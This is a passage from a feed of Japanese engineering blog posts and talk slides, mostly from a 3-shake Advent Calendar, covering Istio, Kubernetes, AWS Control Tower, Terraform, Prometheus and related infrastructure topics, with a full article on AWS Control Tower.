Envoyによるクラスター選択Envoyは、クラスターに紐づくPodのインスタンスのエンドポイント (11.0.0.X/:50002) を選びます。(6) 宛先マイクロサービスへのリクエスト送信Envoyは、エンドポイントの宛先にPodのリクエストを送信します。サービスディスカバリーの冒険は以上です⛵05. おわりにIstioの機能の1つである『サービスディスカバリー』の仕組みを、Envoyを交えながらもりもり布教しました。愛が溢れてしまいました。Istioの機能を1つとっても、複雑な仕組みで実現していることがお分かりいただけたかと思います。Istioありがとう\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F謝辞3-shake SRE Tech Talk での発表前後に、以下の方々に発表内容について助言をいただきました。@ido_kara_deru さん@yosshi_ さん@yteraoka さん(アルファベット順)また、今回の 3-shake Advent Calender 2022 は、以下の方々に企画いただきました。@jigyakkuma_ さん@nwiizo さん(アルファベット順)皆様に感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'ReillyAmazon","isoDate":"2022-12-24T21:00:00.000Z","dateMiliSeconds":1671915600000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Linkerdにおけるトラフィック制御","link":"https://zenn.dev/kimitsu/articles/linkerd-traffic-control","contentSnippet":"Linkerd は Kubernetes 用の軽量サービスメッシュです。複雑な設定なしにセキュリティ、可観測性、信頼性をクラスタに追加できるのが特徴とされています。また CNCF では Graduated Project としてホストされています。（ちなみにサービスメッシュのデファクトスタンダードとされている Istio は CNCF では Incubating Project です。）Linkerd の機能の 1 つにトラフィックの制御があります。これはある Pod にリクエストを投げられるのは特定の Pod だけというような制限をかけるためのものです。トラフィック制御の設...","isoDate":"2022-12-24T12:56:07.000Z","dateMiliSeconds":1671886567000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Steam Deck に Windows を入れたい方の参考になれば...!","link":"https://qiita.com/tozastation/items/a57df36a369b5425795a","contentSnippet":"この記事は 3-shake Advent Calendar 2022 の24日目の記事です。はじめに年末、しかもクリスマスということで散財させていただきました。初めまして、戸澤といいます。日常では「たらこさん」「サーモンさん」と呼ばれています。日々の業務としては、3...","isoDate":"2022-12-24T08:36:33.000Z","dateMiliSeconds":1671870993000,"authorName":"tozastation","authorId":"tozastation"},{"title":"KubernetesのマニフェストをCIで検査する方針を考える","link":"https://zenn.dev/tayusa/articles/ad9fafa197888b","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 17日目の記事です。https://qiita.com/advent-calendar/2022/3-shake 概要以下の気持ちでKubernetesのマニフェストを検査するツールを選定しました。ベストプラクティスに則りたい細かなレビューの手間を省きたいセキュリティリスクを排除したい保守するのが大変なので出来るだけ自分でポリシーは書きたくない。書くとしても書きやすい方法で記述したい 検査ツールの選定以下のツールからカテゴリ別に選定することにしました。スキーマ検査kubeval...","isoDate":"2022-12-17T03:48:50.000Z","dateMiliSeconds":1671248930000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"CloudWatch Logs のログストリームごとのサイズを取得する","link":"https://zenn.dev/toshikish/articles/684e4d7ed4532f","contentSnippet":"動機Amazon CloudWatch Logs のログストリームごとのサイズを知りたいことがありました。たとえば Amazon EKS クラスタを立ち上げて Fluentd または Fluent Bit でログを CloudWatch Logs に送る設定をすると，Pod のログは単一のロググループ（デフォルトでは /aws/containerinsights/Cluster_Name/application）に集約されます。https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/Container-Ins...","isoDate":"2022-12-16T08:57:33.000Z","dateMiliSeconds":1671181053000,"authorName":"toshikish","authorId":"toshikish"},{"title":"エンジニア市場拡大のための「憧れの職業」の重要性に関する緒論","link":"https://qiita.com/skikkh/items/21c270c7ff7a942dc5f7","contentSnippet":"はじめに今回、4年ぶりにQiitaに記事を投稿させていただく。ひょんなきっかけ1で私は、自身が勤めるスリーシェイクのアドベントカレンダーである3-shake Advent Calendar 2022の16日目を担当することとなった。本投稿がそれに当たる。私は、現在3...","isoDate":"2022-12-16T02:21:05.000Z","dateMiliSeconds":1671157265000,"authorName":"skikkh","authorId":"skikkh"},{"title":"⛵️ Istioのサービス間通信を実現するサービスディスカバリーの仕組み","link":"https://speakerdeck.com/hiroki_hasegawa/istioniyorusahisuteisukaharinoshi-zu-mi","contentSnippet":"『3-shake SRE Tech Talk』の登壇資料です\\r\\rIstioのサービスディスカバリーの仕組みについて、Envoyを交えながら解説しました。\\r\\rスライドでは仕組みの詳細を解説できませんでしたので、ぜひ元記事 (Istioのサービス間通信を実現するサービスディスカバリーの仕組み) も参照ください\uD83D\uDC4D\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1603344099368570880","isoDate":"2022-12-15T05:00:00.000Z","dateMiliSeconds":1671080400000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Play with \uD83D\uDC10 in Kubernetes","link":"https://speakerdeck.com/kyohmizu/play-with-in-kubernetes","contentSnippet":"3-shake SRE Tech Talk 2022 クリスマス直前会！の資料です。\\rhttps://3-shake.connpass.com/event/267080/","isoDate":"2022-12-15T05:00:00.000Z","dateMiliSeconds":1671080400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"【Istio⛵️】\\"3-shake SRE Tech Talk\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2022/12/15/025523","contentSnippet":"発表スライドから得られる知識イベント名発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️Istioのサービスディスカバリーの仕組みについてみんな！スライドぜってぇ見てくれよな！イベント名オッス！オラ長谷川！✋\uD83C\uDFFB『Istioのサービス間通信を実現するサービスディスカバリーの仕組み』ていうテーマで、 3-shake SRE Tech Talk に登壇したぞ！本日の発表資料です！⛵️#SRETThttps://t.co/0MKMYVa77u— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) December 15, 2022 ちな、発表内容の詳細はこの記事をみてくれよな！","isoDate":"2022-12-15T03:00:00.000Z","dateMiliSeconds":1671073200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"時間がない人のための AWS Solutions Architect - Professional 勉強法","link":"https://zenn.dev/toshikish/articles/06d85a2db79f4d","contentSnippet":"難度が高くしっかりとした準備が必要な AWS SA Pro 試験を申し込んだものの，残された時間があまりないという方向けに書いた勉強法の記事です。 試験の概略 特徴長文の選択式問題が75問出題され，それを180分で解くという長丁場な試験です。ざっくり1問あたり2分24秒かけられます。75問もあり，1問に複数のサービスを関連させられるので，AWS が重点的に問いたいサービス・テーマはもれなく出現します。AWS を使った2年以上の実務経験が想定されていますが，たいていの場合，実務で扱うサービスは主要なサービスに限られ，触ったこともないサービスが多く出題されます。そのため，確...","isoDate":"2022-12-12T10:46:25.000Z","dateMiliSeconds":1670841985000,"authorName":"toshikish","authorId":"toshikish"},{"title":"AWS Control Towerを調べる","link":"https://blog.masasuzu.net/entry/2022/12/10/204957","contentSnippet":"これは  3-shake Advent Calendar 2022 10日目の記事です仕事の中でAWSで複数のアカウントを管理したいという要件あり、その中でAWS Control Towerが使えないかなと調べたものをざっくりと書いていきます。AWS Control TowerとはAWS Control TowerとはLanding Zoneを実装するためのAWSのマネージドサービスです。そもそもLanding Zoneって何って話になりますね。Landing Zoneとはセキュリティとコンプライアンスのベストプラクティスに基づきアーキテクチャ設計とマルチアカウント環境を管理する仕組みを指します。Landing Zoneは、下記機能から構成されます。アカウントの発行必要な初期設定の済んだアカウントを作成管理用権限の発行対象アカウントを管理するための権限を作成AWS ログの集約監査用ログをセキュアに一元保存ガードレールの設置実施してはいけない操作の禁止危険な設定の監視Landing Zoneの実装方法AWS Control TowerAWSサービスとして提供される Landing Zoneです。容易に利用可能ですが、カスタマイズするには制限があります。(必須のガードレールを外せなかったり)主にこれからAWSを利用する場合に利用できます。既存アカウントにも適用可能です。独自実装の Landing Zone自組織で独自実装するパターンです。自組織の方針に従って自由にカスタマイズできるのが強みです。ただし、自由にカスタマイズはできますが、自身でメンテナンスしないといけないので、コストはかかります。主に既存アカウントに適用する場合に利用できます。自組織でアカウント発行の仕組みや管理の仕組みができあがってる場合などです。そもそもなんでマルチアカウントにするのかAWSをマルチアカウントにする観点として以下のものが考えられます。環境の分離開発、テスト、本番を分離することによるセキュリティおよび統制の確保請求の分離部門やシステム単位でのコスト明確化権限の分離部門間での権限分離およびアカウントへの権限移譲複雑性の分離アカウントの目的を明確に絞ることで、構成がシンプルになるAWS Organizationsだけでもできることマルチアカウント管理するだけならOrganizationだけでもある程度はできます。むしろAWS Control TowerはOrganizationの機能を利用しています。複数AWSアカウントの一元管理Organization Unit(OU)の作成複数アカウントのグルーピング化AWSアカウントの発行Service Control Policyの作成、OUへの適用複数アカウントの一括請求AWS Control Towerだと何ができるのかControl Towerで提供される機能として以下のものがあります。Landing Zoneの提供AWS Organizationを使用してマルチアカウントを作成デフォルトでSandbox、SecurityのOUを作成AWS IAM アイデンティティセンターを利用したID管理を提供Account FactoryAWSアカウントのプロビジョニングの自動化設定可能なテンプレートを提供CloudTrailとConfigログの保存Log Archiveアカウント内のS3バケットに一元的に保存されるガードレールの提供必須と任意の観点の2種類と予防的と発見的の2種類の組み合わせがありControl Towerにより管理下のアカウントに適用される参考: ガードレールの仕組み予防的ガードレール(Service Control Policy)禁止されたアクションの実行が拒否される仕組みControl Tower管理下のアカウントは必須の予防的ガードレールで禁止されているアクションが不可能発見的ガードレール(Config)特定のイベントが発生したときにCloudTrailに記録される仕組みダッシュボードOUやアカウント、ガードレール違反などが一覧表示できるAWS Control TowerではできないことAWS Control Towerでは提供されてない機能もあります。GuardDutyやSecurity Hubなどのセキュリティ機能を組織全体適用するにはOrganizationsの機能を利用する必要があります。AWS Control Towerの注意点、制約事項いろいろ資料を見てみてこの辺注意が必要かなという点を書いていきます。注意点既存アカウントの Control Tower への受入処理時にエラーになった場合、スタックセット内で自動実行される作業の一部手作業が必要になる参考:トラブルシューティング - AWS Control Tower独自ガードレールの追加は可能だが、容易ではない。必須ガードレールを外せない参考:必須のガードレール - AWS Control Tower各種セキュリティー機能は自動で有効化されないため、Control Towerの範囲外のセキュリティ機能は Control Tower の機能の外で管理が必要になる範囲内の機能: Config, CloudTrail, SCP範囲外の機能: GuardDuty, Security Hub, IAM Access Analyzer, DetectiveControl Tower 未対応リージョンを使用している場合、Control Tower適用リージョンと適用外リージョンが混在して管理が煩雑になる大阪リージョン未対応なのでマルチリージョンを考えるときに注意Control Towerはマネージドサービスであるが追加機能によっては手動バージョンアップ が必要になるケースがある参考: ランディングゾーンを更新する - AWS Control Tower参考: 更新について - AWS Control Towerログアーカイブアカウントで独自のログバケットを作成可能だが、非推奨参考: ランディングゾーンのセットアップに関する管理上のヒントリージョンの使用を制限する SCP の併用に注意が必要参考: AWS Control Tower リソースの作成および変更に関するガイダンスIaC との境界の検討が必要アカウント発行に関してはControl Tower(Account Factory)で手動で行い、その後のアカウント設定はTerraformで行うなどAccount Factory for Terraformを利用することでAWSアカウント発行は可能参考: AWS Control Tower Account Factory for Terraform によるアカウントのプロビジョニングどこまでTerraformで対応するかは別途検討が必要制限とクォータS３へのログの保存期間は、最大15年間保存可能(最近アップデートされた)Security OU の共有アカウントの E メールアドレスは変更可能だが、これらの変更を AWS Control Tower コンソールで確認するには、Landing Zone を更新する必要があるAWS Control Tower Landing zone の OU には、OU あたり5個のSCPの制限が適用される300超のアカウントを持つ既存の OU は、AWS Control Tower に登録することはできない300を超える場合はOUを分ける必要があるOUのネストは２段階まで、孫OUを持つことはできない参考: AWS Organizations における組織単位のベストプラクティスAWS Control Towerを使うべきなのかマルチアカウントを展開していくのであれば、AWSのベストプラクティスに乗れるので、使用するのが無難です。ただし、独自のLanding Zoneをすでに構築しており、Account Factoryの仕組みも独自で構築できているのであれば、移行コストを鑑みてそのままでも問題ないです。必須の予防的ガードレールが許容できない、OUなどの制限にひっかるなどの運用上の制約がある場合は使えないので、組織のポリシーを見直すか、独自でLanding Zoneを作るかを考える必要があります。発展もっと調査したかったが、時間が足りなかったことや今後調べたいことです。コンソールからAccount Factory実行するとService Catalogの設定項目がありますが、Service Catalog自体の理解不足でどう扱うのかが把握できてないのでこの辺調べたいです。Account Factory for Terraform(AFT)を使うとアカウント発行そのものもIaC化できるので試したい。参考: AWS Control Tower Account Factory for Terraform によるアカウントのプロビジョニング参考: ついにControl Towerのアカウント発行からカスタマイズまでIaC対応！Account Factory for Terraform (AFT)が新登場 #reinvent | DevelopersIOCustomization for Control Tower(CfCT)を使うとアカウント発行のイベントをトリガーにCloudFormationを実行できるので、これも実験したい。参考: AWS Control Tower のカスタマイズ (CfCT) の概要 - AWS Control Tower参考: Control Towerカスタマイズソリューション(CfCT)を使ってガードレールとCloudFormationを自動展開してみた | DevelopersIOまとめControl Towerについて調べたことを書いていきました。実運用自体はまだしてないので、これから触ってみて知見が溜まってきたらまたそれも共有できたらと思います。","isoDate":"2022-12-10T11:49:57.000Z","dateMiliSeconds":1670672997000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"インシデント対応しながら書くポストモーテム","link":"https://zenn.dev/toshikish/articles/1d5bcf9ed1939d","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 8日目の記事です。サービスにおいてインシデントが発生した場合に書くポストモーテムについて，書く負担を減らせるようなテンプレートを提案します。 ポストモーテムのテンプレートポストモーテムのテンプレートは，例えば以下のようなものが公開されています。 Google SREhttps://sre.google/sre-book/example-postmortem/タイトル・インシデント ID日付対応者ステータス概要影響主な原因障害発生のトリガー解決策検知アクションアイテム...","isoDate":"2022-12-07T22:00:00.000Z","dateMiliSeconds":1670450400000,"authorName":"toshikish","authorId":"toshikish"},{"title":"社会に蔓延る労苦〈Toil〉をなくす（株式会社スリーシェイク入社エントリ）","link":"https://qiita.com/tayakun/items/2f5ca30b777a54b2c52d","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 5日目の記事です。前日は @aqarium さんによる 徒然なるままにDatadog APM でした。私は株式会社スリーシェイクに入社し１ヶ月がたちました。そこで入社エントリーを書き、どうして...","isoDate":"2022-12-05T14:18:53.000Z","dateMiliSeconds":1670249933000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Prometheus で探索対象の ServiceMonitor を広げる","link":"https://zenn.dev/toshikish/articles/70424038397d6d","contentSnippet":"Kubernetes クラスタで Prometheus を導入し，ServiceMonitor を作って監視対象を定義したところ，一向に Target として追加されないことがありました。ServiceMonitor が作られているだけでは不十分で，Prometheus の探索する対象に入っている必要があります。それがどこで定義されているかを調べました。以下のような ServiceMonitor を考えます。apiVersion: monitoring.coreos.com/v1kind: ServiceMonitormetadata:  name: example-serv...","isoDate":"2022-12-05T09:53:34.000Z","dateMiliSeconds":1670234014000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Cloud Runで定期ジョブを実行する","link":"https://zenn.dev/satohjohn/articles/20ebf8d1bed1d1","contentSnippet":"本記事は GCP(Google Cloud Platform) Advent Calendar 2022 の4日目のものです。3日目は @po3rin さんのAPI on GKE に高速で認証をつけるIdentity-Aware Proxy \xd7 Identity Platform でした。 概要普段、GCPを使ったWebアプリケーション開発をしていますが、その中で、定期的に(スケジューリングをして)、ジョブを実行するということがあります。例えば、DBのデータの整合性とか、ログの収集とか。。。この要件のときは、GCP内で完結させるとして、Cloud SchedulerのHTTP...","isoDate":"2022-12-04T13:48:19.000Z","dateMiliSeconds":1670161699000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Codecov非対応の言語でもCodecovみたいなことをしたい時","link":"https://zenn.dev/kimitsu/articles/coverage-like-codecov","contentSnippet":"Codecov は、PR へのコメントや README のバッジのような方法でコードのカバレッジを可視化できるツールです。カバレッジを開発者に対して頻繁にフィードバックすることで、開発者はテストを意識するようになります。一方で世の中には星の数ほど言語がありますが Codecov がサポートしているものは意外と少ないです。https://docs.codecov.com/docs/supported-languagesまた色々な理由で Codecov を使いたくない / 使えないという場合もあるかと思います。この記事では Codecov 非対応の言語でも Codecov みたいな...","isoDate":"2022-11-29T13:38:06.000Z","dateMiliSeconds":1669729086000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"複数の Terraform リソースを一度に別の tfstate ファイルに移動する","link":"https://zenn.dev/toshikish/articles/61db8661cb28ba","contentSnippet":"Terraform の tfstate ファイル間のリソースの移動方法は，基本的には以下の記事の通りです。https://www.karakaram.com/moving-terraform-resources-to-another-tfstate-file/この記事では複数リソースを移動したい場合の方法を書きます。 方法やることはシンプルで，リソースをファイルで列挙して xargs で terraform state mv を繰り返すだけです。移動元ディレクトリで terraform state list を実行することで，その tfstate ファイル内の全リソースを取...","isoDate":"2022-11-25T07:33:50.000Z","dateMiliSeconds":1669361630000,"authorName":"toshikish","authorId":"toshikish"},{"title":"docker-buildxとmulti-platform build周りについてまとめ","link":"https://zenn.dev/bells17/articles/docker-buildx","contentSnippet":"最近docker buildxを使ったmulti-platform build周りについての知見がある程度溜まってきたので必要そうな情報をまとめておく。buildx自体が実際に使うとハマりどころが多いので、すんなりと納得できるような文章がかけてないとは思うけど、実際に触る人がハマったり疑問に思ったりする内容の穴埋めはある程度できてるとは思ってる。ちなみにこの記事を書いてる時点のdocker-buildxの最新バージョンがv0.9.1なので、貼ってあるbuildxのリンクについては基本このバージョンのものになる。 docker-buildxってなに？リポジトリを見るとdock...","isoDate":"2022-11-19T16:52:45.000Z","dateMiliSeconds":1668876765000,"authorName":"bells17","authorId":"bells17"},{"title":"AWS IAM ポリシーの StringNotEquals 条件の複数値指定は AND になる","link":"https://zenn.dev/toshikish/articles/2d9274783acbae","contentSnippet":"AWS IAM ポリシーの条件で同一キーに対して複数値を指定した場合，通常は OR で評価されます。例えば，以下の StringEquals 条件の例では，aws:PrincipalTag/role が audit または security のいずれかであれば true になります。\\"Condition\\": {  \\"StringEquals\\": {    \\"aws:PrincipalTag/role\\": [ \\"audit\\", \\"security\\" ]  }}では StringNotEquals 条件にするとどうでしょうか？例えば以下のポリシーで aws:Principal...","isoDate":"2022-11-10T08:31:56.000Z","dateMiliSeconds":1668069116000,"authorName":"toshikish","authorId":"toshikish"},{"title":"2022年10月のふりかえり、まとめ","link":"https://blog.masasuzu.net/entry/2022/11/09/082007","contentSnippet":"7年ぶりにふり返りするような気がします。これぶりですかね。blog.masasuzu.net10月は思い立って細かいことでも記録に残すようにし始めたのでサブブログの月間投稿数が増えてます。このまま続けたいところです。メインブログは相変わらず0なのでちゃんと書きたいところではあります。2022-10-01から1ヶ月間の記事一覧 - ふり返る暇なんて無いね仕事10月は端境期だったので、技術検証をメインでやってました。技術メインブログの方はどちらかというとパブリック向けに書いてます。ただ、この方針だと記事がゆるい記事が書きにくくなってきたので、サブブログを作った経緯があります。サブブログの技術記事は他の誰かのためではなく未来の自分が思い出すために書くをモットーに書いてます。なのでゆるく、細かい系のことも気軽に書いてます。分からないことは分からないと明示する。途中でも経過を残す。恥も残す。そんな感じです。以前とくらべてGoogle Cloud回りを10月はいじってた感じですね。build-in commandのmanが引けなくて困った - ふり返る暇なんて無いねt3系インスタンスのスペックについて - ふり返る暇なんて無いねGoogle Cloudの外部HTTP(S)ロードバランサと外部HTTP(S)ロードバランサ(従来型)の違いがわからなかった。 - ふり返る暇なんて無いね未解決: Google Cloud Storageの静的配信でnginxで言うところのtry_files的なことをしたかった。。。。 - ふり返る暇なんて無いねはてなブログのカテゴリごとのRSSフィード - ふり返る暇なんて無いねGitHub Actionsで save-state とset-output が廃止されるようです。 - ふり返る暇なんて無いね故障と障害の違いがわからずに困惑してた - ふり返る暇なんて無いね資格PCA取りました!11月にはPCA、KCNA、年内にCKA、CKADを取ることを目標に業務とは別に学習してます。なお、業務ではGoogle CloudもKubernetesも今のところ触る余地ないです。が、将来の投資として学習してます。近い未来で使うのが目に見えてるので。Google Cloud認定 Professional Cloud Architect合格してた - ふり返る暇なんて無いね11月末ターゲットで2個資格試験受けます - ふり返る暇なんて無いね旅土曜日の午前中に温泉入るのにはまってます。休日の早い時間に行動すると時間の有効活用ができるなとしみじみ感じてます。人生に疲れたので熱海で温泉入ってきた - ふり返る暇なんて無いね横須賀で温泉入ってきた - ふり返る暇なんて無いね江ノ島に行ってきて午前中だけで満足した - ふり返る暇なんて無いね生活寒くなりましたが、がんばります。今季初暖房使いました。 - ふり返る暇なんて無いね技術書を複数回読むということ - ふり返る暇なんて無いねワクチン4回目打った\uD83D\uDC89\uD83D\uDC89\uD83D\uDC89\uD83D\uDC89 - ふり返る暇なんて無いね11月に向けてといっても11月始まってますが。11月は資格の勉強もあるし、新しい固めのお仕事も始まるので、だいぶヘビーになる予感を感じてます。寒くなる季節なので体調には気を付けつつも、引き続き温泉につかり、ブログ書くのも続けて行きたいですね。","isoDate":"2022-11-08T23:20:07.000Z","dateMiliSeconds":1667949607000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[2022/10/28] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20221028","contentSnippet":"#kubenewsの2022年10月28日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/whnN4hwsIYg 告知とかニュースっぽいもの Open Networking Conference Japanちょうど今日開催し...","isoDate":"2022-10-28T13:05:14.000Z","dateMiliSeconds":1666962314000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes クラスタ内ホスト名に CNAME レコードでエイリアスを付与したい","link":"https://zenn.dev/toshikish/articles/7f555dbf1b4b7d","contentSnippet":"Kubernetes クラスタ内で使えるホスト名に CNAME レコード相当でエイリアスを付与したい場合を考えます。クラスタ内では CoreDNS が使われているものとします。 TL;DRCorefile（CoreDNS の設定ファイル）で rewrite プラグインを使って記述します。例えば Service のアドレスである foo.default.svc.cluster.local を foo.example.com にエイリアスしたい場合は以下のように行を追加します。apiVersion: v1kind: ConfigMapmetadata:  name: cor...","isoDate":"2022-10-28T10:45:26.000Z","dateMiliSeconds":1666953926000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Bugless Code","link":"https://speakerdeck.com/yunosukey/bugless-code","contentSnippet":"","isoDate":"2022-10-16T04:00:00.000Z","dateMiliSeconds":1665892800000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Tests in Go","link":"https://speakerdeck.com/yunosukey/tests-in-go","contentSnippet":"","isoDate":"2022-10-16T04:00:00.000Z","dateMiliSeconds":1665892800000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"DB Tree Algorithms","link":"https://speakerdeck.com/yunosukey/db-tree-algorithms","contentSnippet":"","isoDate":"2022-10-16T04:00:00.000Z","dateMiliSeconds":1665892800000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"React and XSS","link":"https://speakerdeck.com/yunosukey/react-and-xss","contentSnippet":"","isoDate":"2022-10-16T04:00:00.000Z","dateMiliSeconds":1665892800000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Istio のサービスへの接続でプロトコルエラーになる","link":"https://zenn.dev/toshikish/articles/d0dd54ae067bed","contentSnippet":"現象Istio サービスメッシュを有効にした Kubernetes クラスタ内に立てた Service に接続しようとするも，upstream connect error or disconnect/reset before headers. reset reason: protocol error が出て到達できない。例えば，以下のような Service に gRPC で接続しようとしても失敗する。apiVersion: v1kind: Servicemetadata:  name: my-servicespec:  selector:    app.kubern...","isoDate":"2022-10-04T02:55:06.000Z","dateMiliSeconds":1664852106000,"authorName":"toshikish","authorId":"toshikish"},{"title":"SQL*Loaderで複数の文字コードが混ざったデータをロードする","link":"https://zenn.dev/nnaka2992/articles/load_complex_characterset_oracle","contentSnippet":"SQL*Loaderで複数の文字コードが混ざったデータをロードする 概要単一のテキストファイル内で特定のカラムのみ文字コードが違うファイルをSQL*Loaderでデータベースに取り込む方法 注意本記事で扱っている対処方法はおそらく紛れ込んだ文字コードが本来あるべき文字コードの一部として解釈できない場合使用できないと思います。(未検証)最低限文字化けしながらも読み込める状態を想定しています。 結論コントロールファイル内で文字コードの変換が必要なカラムに以下の関数を適用する。column \\"CONVERT(:column, \'target_charset\', \'s...","isoDate":"2022-09-25T14:48:29.000Z","dateMiliSeconds":1664117309000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"[2022/09/02] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220902","contentSnippet":"#kubenewsの2022年09月2日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/r2YsmQFcv-o 告知とかニュースっぽいもの controller-runtime clientについてhttps://zenn....","isoDate":"2022-09-02T13:01:11.000Z","dateMiliSeconds":1662123671000,"authorName":"bells17","authorId":"bells17"},{"title":"Visual Studio Codeで使えるリモート環境のdevcontainerが意外と便利そうだったのでまとめ","link":"https://zenn.dev/bells17/articles/remote-ssh-devcontainer","contentSnippet":"試してたらたまたまVisual Studio Code(vscode)のdevcontainer(Remote Container)が、Remote SSH経由でリモート環境でも使えることを知ったので、devcontainer用の環境構築方法やdevcontainerの構築方法についてまとめてみた今まではローカル環境のdockerか、codespaceでしか利用できないのかなと思っていたのだけど、リモート含めて利用できるとかなり便利そうな印象だったので一通り試してみました最近はRemote SSHでリモート環境を利用するケースが多いのでリモート環境で使えないならそんなに使えないかなと...","isoDate":"2022-09-01T18:16:25.000Z","dateMiliSeconds":1662056185000,"authorName":"bells17","authorId":"bells17"},{"title":"controller-runtime clientについて","link":"https://zenn.dev/bells17/articles/controller-runtime-client","contentSnippet":"KubernetesでOperatorやControllerを開発する際に利用するフレームワークであるcontroller-runtimeのclientについて調べたのでまとめます。この記事の目的は以下のような感じになります:controller-runtimeが提供するKubernetes clientの概要についてまとめることcontroller-runtime client周りの追加の不明点などがあった場合には、この記事をベースにコードベースで調べたいことをすぐに調べられる程度にはコードレベルで詳しい内容をまとめること以下についてわかるようになること各種内部clien...","isoDate":"2022-08-27T09:30:47.000Z","dateMiliSeconds":1661592647000,"authorName":"bells17","authorId":"bells17"},{"title":"Software Design 2022年9月号にコードリーディングに関する記事を寄稿しました","link":"https://bells17.medium.com/oss-source-code-reading-29392edf80fe?source=rss-713cf42ce34d------2","isoDate":"2022-08-18T15:06:54.000Z","dateMiliSeconds":1660835214000,"authorName":"bells17","authorId":"bells17"},{"title":"Security Command Center \xd7 PagerDuty 自動アラート通知の取り組み","link":"https://speakerdeck.com/kyohmizu/security-command-center-x-pagerduty-zi-dong-aratotong-zhi-falsequ-rizu-mi","contentSnippet":"3-shake SRE Tech Talk #4 の登壇資料です。\\rhttps://3-shake.connpass.com/event/253028/","isoDate":"2022-08-04T04:00:00.000Z","dateMiliSeconds":1659585600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"SRETT#4黒い画面をもっと効率的に(使って自動化の時間を捻出)","link":"https://speakerdeck.com/masasuzu/srett-number-4hei-ihua-mian-womotutoxiao-lu-de-ni-shi-tutezi-dong-hua-falseshi-jian-wonian-chu","contentSnippet":"","isoDate":"2022-08-04T04:00:00.000Z","dateMiliSeconds":1659585600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[2022/07/015] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220715","contentSnippet":"#kubenewsの2022年07月15日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/ar1_fxX601E 告知とかニュースっぽいもの 『Linuxで動かしながら学ぶTCP/IPネットワーク入門』でネットワークの勉強をし...","isoDate":"2022-07-15T07:31:08.000Z","dateMiliSeconds":1657870268000,"authorName":"bells17","authorId":"bells17"},{"title":"サイバー攻撃から Kubernetes クラスタを守るための効果的なセキュリティ対策","link":"https://speakerdeck.com/kyohmizu/saibagong-ji-kara-kubernetes-kurasutawoshou-rutamefalsexiao-guo-de-nasekiyuriteidui-ce","contentSnippet":"CloudNative Security Conference 2022 プレイベント の登壇資料です。\\rhttps://cloudnativedays.connpass.com/event/252961/","isoDate":"2022-07-12T04:00:00.000Z","dateMiliSeconds":1657598400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"[2022/07/01] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220701","contentSnippet":"#kubenewsの2022年07月01日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/R7VHtaBZFkQ 告知とかニュースっぽいもの Kubernetes Novice Tokyo #20にてKueueのセッションを行...","isoDate":"2022-07-01T11:14:01.000Z","dateMiliSeconds":1656674041000,"authorName":"bells17","authorId":"bells17"},{"title":"AWS SAP 合格体験記 